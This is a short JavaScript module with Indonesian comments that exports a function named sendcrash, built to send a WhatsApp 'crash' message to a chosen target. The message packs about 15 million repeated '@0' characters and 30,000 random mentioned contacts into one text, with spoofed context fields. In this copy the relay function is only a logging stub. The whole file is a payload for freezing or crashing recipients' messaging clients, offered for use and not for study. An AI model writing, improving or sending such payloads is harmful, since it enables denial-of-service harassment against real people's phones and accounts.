const aorbugz = {
    relayMessage: async (target, message, options) => {
        console.log(`Mengirim pesan ke: ${target}`);
        console.log(`Pesan: ${message.extendedTextMessage.text}`);
        return Promise.resolve();
    }
};

async function sendcrash(target, Ptcp = false) {
    const crashText = "⩟⬦𪲁 Aorbugz?͜͢𝐒 -" + "@0".repeat(15000000); // Menambah ukuran pesan crash
    const mentionedJid = [
        "0@s.whatsapp.net",
        ...Array.from({ length: 30000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`) // Menambah jumlah mention
    ];

    await aorbugz.relayMessage(target, {
        extendedTextMessage: {
            text: crashText,
            contextInfo: {
                mentionedJid: mentionedJid,
                stanzaId: "1234567890ABCDEF",
                participant: "0@s.whatsapp.net",
            }
        }
    }, Ptcp ? { participant: { jid: target } } : {});
}

module.exports = sendcrash;
